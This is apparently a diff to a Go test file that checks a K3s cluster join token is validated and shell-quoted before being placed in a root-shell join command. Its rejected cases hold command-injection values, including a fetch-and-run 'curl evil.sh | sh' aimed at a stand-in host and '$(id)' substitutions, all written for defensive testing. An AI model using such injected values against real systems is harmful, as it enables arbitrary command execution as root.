@@ -2,6 +2,7 @@ package cluster
 
 import (
 	"context"
+	"errors"
 	"io"
 	"log/slog"
 	"os"
@@ -12,6 +13,7 @@ import (
 
 	"github.com/codeblocktz/yacht/internal/secret"
 	"github.com/codeblocktz/yacht/internal/store"
+	"github.com/codeblocktz/yacht/internal/store/dbgen"
 )
 
 // A pool name ends up in a command somebody pastes into a root shell, so the
@@ -95,7 +97,7 @@ func TestTheCommandJoinsAnAgentAndLabelsIt(t *testing.T) {
 	for _, want := range []string{
 		"curl -sfL https://get.k3s.io",
 		"K3S_URL=https://10.0.0.1:6443",
-		"K3S_TOKEN=K10secret::server:pw",
+		"K3S_TOKEN='K10secret::server:pw'",
 		"sh -s -",
 		"--node-label yacht/pool=web",
 	} {
@@ -111,6 +113,62 @@ func TestTheCommandJoinsAnAgentAndLabelsIt(t *testing.T) {
 	// A pool on its own is shared: labelled, and open to anyone's apps.
 	if strings.Contains(got, "--node-taint") {
 		t.Errorf("a shared pool's node was tainted:\n%s", got)
+	}
+}
+
+// The token is pasted in by a person from a file on another machine and goes
+// into a root shell, so it is held to the shapes K3s writes rather than
+// escaped and hoped over. Every rejected case below is a command that would
+// otherwise run.
+func TestAJoinTokenCannotEndTheCommand(t *testing.T) {
+	const digest = "6f8a2c4e9b1d3f5a7c9e0b2d4f6a8c0e1b3d5f7a9c1e3b5d7f9a1c3e5b7d9f1a"
+	for _, tc := range []struct {
+		name  string
+		token string
+		ok    bool
+	}{
+		{"secure server token", "K10" + digest + "::server:5f1c2a9b8e7d6c5b4a3f2e1d0c9b8a7f", true},
+		{"secure agent token", "K10" + digest + "::node:hunter2", true},
+		{"secure bootstrap token", "K10" + digest + "::abcdef.0123456789abcdef", true},
+		{"bootstrap token", "abcdef.0123456789abcdef", true},
+		{"plain password", "s3cr3t-Token_1", true},
+		{"base64 password", "c2VjcmV0K3Rva2Vu/x==", true},
+
+		{"empty", "", false},
+		{"semicolon", "K10" + digest + "::server:pw; curl evil.sh | sh", false},
+		{"substitution", "pw$(id)", false},
+		{"backtick", "pw`id`", false},
+		{"single quote", "pw'; id; '", false},
+		{"space", "pw --server https://evil", false},
+		{"newline", "pw\ncurl evil.sh", false},
+		{"pipe", "pw|id", false},
+		{"secure form with a non-hex digest", "K10secret::server:pw", false},
+		{"secure form with no credential", "K10" + digest + "::", false},
+		{"too long", strings.Repeat("a", 513), false},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			err := ValidateToken(tc.token)
+			if tc.ok && err != nil {
+				t.Fatalf("ValidateToken(%q) = %v, want accepted", tc.token, err)
+			}
+			if !tc.ok && err == nil {
+				t.Fatalf("ValidateToken(%q) was accepted — it would run in a root shell", tc.token)
+			}
+		})
+	}
+}
+
+// Quoted on top of the check, so the command is safe even for a token that
+// reached BuildCommand without passing it — and a quote inside it is closed,
+// escaped and reopened rather than ending the word.
+func TestTheTokenIsQuotedInTheCommand(t *testing.T) {
+	got := BuildCommand("https://10.0.0.1:6443", "K10ab::server:pw", Machine{})
+	if !strings.Contains(got, "K3S_TOKEN='K10ab::server:pw' sh -s -") {
+		t.Errorf("the token is not single-quoted:\n%s", got)
+	}
+	got = BuildCommand("https://10.0.0.1:6443", "pw'; id; '", Machine{})
+	if !strings.Contains(got, `K3S_TOKEN='pw'\''; id; '\''' sh -s -`) {
+		t.Errorf("a quote in the token ends the quoted word:\n%s", got)
 	}
 }
 
@@ -266,6 +324,44 @@ func TestAJoinTokenIsRefusedWithNoKey(t *testing.T) {
 	err := j.SetJoin(context.Background(), "https://10.0.0.1:6443", "K10secret", uuid.New())
 	if err == nil {
 		t.Fatal("a join token was stored with no key to seal it")
+	}
+}
+
+// Refused where it is saved, so a malformed token never reaches the page
+// that hands out the command.
+func TestAMalformedJoinTokenIsNotStored(t *testing.T) {
+	ctx := context.Background()
+	j := testJoiner(t, true)
+
+	if err := j.SetJoin(ctx, "https://10.0.0.1:6443", "pw; curl evil.sh | sh", uuid.Nil); err == nil {
+		t.Fatal("a join token a shell would split was stored")
+	}
+	if _, err := j.Settings(ctx); !errors.Is(err, ErrNotConfigured) {
+		t.Fatalf("settings after a refused token = %v, want ErrNotConfigured", err)
+	}
+}
+
+// And refused where it is used: a token stored before the rule existed is
+// not put into a command.
+func TestAStoredMalformedJoinTokenMakesNoCommand(t *testing.T) {
+	ctx := context.Background()
+	j := testJoiner(t, true)
+
+	sealed, err := j.keeper.Seal("pw$(id)")
+	if err != nil {
+		t.Fatalf("seal: %v", err)
+	}
+	if _, err := j.q.SetClusterJoin(ctx, dbgen.SetClusterJoinParams{
+		ServerUrl: "https://10.0.0.1:6443", TokenSealed: sealed,
+	}); err != nil {
+		t.Fatalf("store the old token: %v", err)
+	}
+	cmd, err := j.Command(ctx, Machine{})
+	if err == nil {
+		t.Fatalf("a command was built from a malformed stored token:\n%s", cmd)
+	}
+	if strings.Contains(err.Error(), "pw$(id)") {
+		t.Error("the refusal carries the token")
 	}
 }
 
